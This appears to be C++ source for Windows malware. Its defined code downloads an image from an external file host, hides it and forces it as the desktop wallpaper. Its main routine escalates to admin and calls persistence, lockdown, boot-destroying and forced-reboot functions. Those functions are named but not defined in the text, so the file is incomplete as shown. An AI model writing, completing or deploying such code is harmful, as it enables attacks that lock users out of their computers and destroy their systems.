#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <urlmon.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "user32.lib")

#define WALLPAPER_URL L"https://files.catbox.moe/8ez2q2.jpg"

bool DownloadFile(const std::wstring& url, const std::wstring& destPath) {
    HRESULT hr = URLDownloadToFileW(NULL, url.c_str(),
        destPath.c_str(), 0, NULL);
    return SUCCEEDED(hr);
}

std::wstring GetWallpaperPath() {
    wchar_t appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
        std::wstring dir = std::wstring(appData) + L"\\Microsoft\\Windows\\Themes";
        CreateDirectoryW(dir.c_str(), NULL);
        SetFileAttributesW(dir.c_str(),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        return dir + L"\\wallpaper.jpg";
    }
    return L"";
}

bool SetWallpaperVerified(const std::wstring& imgPath) {
    if (imgPath.empty()) return false;
    if (GetFileAttributesW(imgPath.c_str()) == INVALID_FILE_ATTRIBUTES)
        return false;

    SetFileAttributesW(imgPath.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

    for (int attempt = 0; attempt < 5; ++attempt) {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0,
            (PVOID)imgPath.c_str(),
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Control Panel\\Desktop", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"Wallpaper", 0, REG_SZ,
                (const BYTE*)imgPath.c_str(),
                (DWORD)((imgPath.length() + 1) * sizeof(wchar_t)));

            const wchar_t* style = L"10";
            RegSetValueExW(hKey, L"WallpaperStyle", 0, REG_SZ,
                (const BYTE*)style, (DWORD)((wcslen(style) + 1) * sizeof(wchar_t)));
            const wchar_t* tile = L"0";
            RegSetValueExW(hKey, L"TileWallpaper", 0, REG_SZ,
                (const BYTE*)tile, (DWORD)((wcslen(tile) + 1) * sizeof(wchar_t)));

            RegCloseKey(hKey);
        }

        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0,
            (PVOID)imgPath.c_str(),
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        Sleep(300);
        wchar_t current[MAX_PATH] = {0};
        DWORD size = sizeof(current);
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Control Panel\\Desktop", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExW(hKey, L"Wallpaper", NULL, NULL,
                (LPBYTE)current, &size);
            RegCloseKey(hKey);
        }

        if (_wcsicmp(current, imgPath.c_str()) == 0)
            return true;

        Sleep(200);
    }
    return false;
}

bool InstallWallpaper() {
    std::wstring dest = GetWallpaperPath();
    if (dest.empty()) return false;

    for (int i = 0; i < 3; ++i) {
        if (DownloadFile(WALLPAPER_URL, dest)) break;
        Sleep(500);
    }

    if (GetFileAttributesW(dest.c_str()) == INVALID_FILE_ATTRIBUTES)
        return false;

    return SetWallpaperVerified(dest);
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    if (!IsRunAsAdmin()) {
        RelaunchAsAdmin();
        return 0;
    }
    while (!InstallWallpaper()) {
        Sleep(1000);
    }
    Sleep(3000);
    SelfInstall();
    InstallRegistryAutostart();
    InstallScheduledTask();
    ApplyLockdown();
    DestroyBoot();
    ForceReboot();
    while (true) Sleep(60000);
    return 0;
}
